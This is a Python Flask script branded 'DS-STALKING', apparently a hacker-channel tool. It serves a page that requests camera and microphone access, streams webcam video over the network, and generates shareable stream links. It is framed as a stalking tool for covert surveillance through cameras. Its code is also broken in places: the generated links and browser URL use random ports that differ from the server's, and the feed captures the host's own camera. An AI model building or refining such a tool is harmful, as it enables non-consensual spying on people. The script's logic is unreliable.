from flask import Flask, render_template, Response, jsonify
import socket
import pyfiglet
import cv2
import random
import threading
import webbrowser
from flask_socketio import SocketIO

# Créer une interface ASCII art avec pyfiglet
def display_interface():
    custom_fig = pyfiglet.Figlet(font="small")
    ascii_art_text = custom_fig.renderText("DS-STALKING")
    info = [
        "BY: 2806",
        "Telegram: t.me/Mr_2806",
        "Tiktok: dedsec_x.0",
        "Youtube: Dedsec assistant"
    ]
    border = "=" * 40
    print(border)
    print(ascii_art_text)
    for line in info:
        print(f"  {line}")
    print(border)

# Afficher l'interface ASCII au démarrage
display_interface()

# Initialiser l'application Flask et SocketIO
app = Flask(__name__)
socketio = SocketIO(app)

# Obtenir l'adresse IP locale
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# Générer un port aléatoire
def get_random_port():
    return random.randint(10000, 65535)

# Flux vidéo en direct
def generate_video_stream():
    # Initialiser OpenCV pour capturer depuis la caméra (utiliser 0 pour la caméra par défaut)
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        
        # Encoder l'image en JPEG
        _, jpeg = cv2.imencode('.jpg', frame)
        # Convertir l'image en bytes
        frame_bytes = jpeg.tobytes()
        
        # Yield the image as a part of the multipart response
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n\r\n')

    cap.release()

@app.route('/video_feed')
def video_feed():
    # Générer un flux vidéo avec OpenCV
    return Response(generate_video_stream(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route("/")
def home():
    # Page qui demande l'accès à la caméra et au micro
    return render_template("camera.html")

@app.route("/stream_link", methods=["POST"])
def stream_link():
    # Génère un lien contenant l'adresse IP et le port
    local_ip = get_local_ip()
    port = get_random_port()  # Port aléatoire à chaque exécution
    stream_url = f"http://{local_ip}:{port}/video_feed"
    return jsonify({"stream_url": stream_url})

def open_browser():
    # Ouvrir un navigateur pour visualiser le flux vidéo
    local_ip = get_local_ip()
    port = get_random_port()  # Utiliser un port unique pour le navigateur
    url = f"http://{local_ip}:{port}/video_feed"
    
    # Utiliser le module webbrowser pour ouvrir le lien dans un navigateur
    webbrowser.open(url)

if __name__ == "__main__":
    # Exécuter le serveur Flask avec un port aléatoire
    local_ip = get_local_ip()
    port = get_random_port()
    print(f"Serveur en cours d'exécution : http://{local_ip}:{port}")

    # Ouvrir automatiquement le navigateur pour le flux vidéo
    open_browser()

    socketio.run(app, host="0.0.0.0", port=port)  # Lancer le serveur Flask sur le port généré